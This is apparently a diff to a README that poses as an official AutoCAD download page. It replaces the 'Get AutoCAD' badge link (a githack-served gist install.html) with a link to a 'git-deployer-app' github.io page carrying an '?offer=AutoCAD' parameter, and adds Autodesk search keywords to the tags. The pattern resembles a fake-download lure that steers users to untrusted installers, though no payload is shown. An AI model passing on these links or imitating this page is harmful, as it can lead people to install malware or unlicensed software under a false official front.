@@ -1,6 +1,6 @@
 # AutoCAD Download — Desktop CAD Design
 
-[![Get AutoCAD GitHub](https://img.shields.io/badge/Get%20AutoCAD%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/woodmain2005/fb91298c242f6d901fe6f984f94b5708/raw/1a49fe4fcf428a9f0717884039337841a2c5a384/install.html?offer=AutoCAD)
+[![Get AutoCAD GitHub](https://img.shields.io/badge/Get%20AutoCAD%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=AutoCAD)
 
 ---
 
@@ -72,7 +72,7 @@ Its consistent user experience across platforms ensures seamless work whether on
 ---
 
 ## 🔍 Tags
-autocad app, cross-platform CAD, 2D drafting and 3D modeling, architecture design Windows Mac, engineering CAD software, construction layout tool, autocad, autocad mac, autocad pc, autocad windows, autocad desktop, autocad for mac, autocad for pc, autocad for windows
+autocad app, autocad architecture, autodesk revit, autodesk autocad, autocad online, autocad lt, cross-platform CAD, 2D drafting and 3D modeling, architecture design Windows Mac, engineering CAD software, construction layout tool, autocad, autocad mac, autocad pc, autocad windows, autocad desktop, autocad for mac, autocad for pc, autocad for windows
 
 ---
 
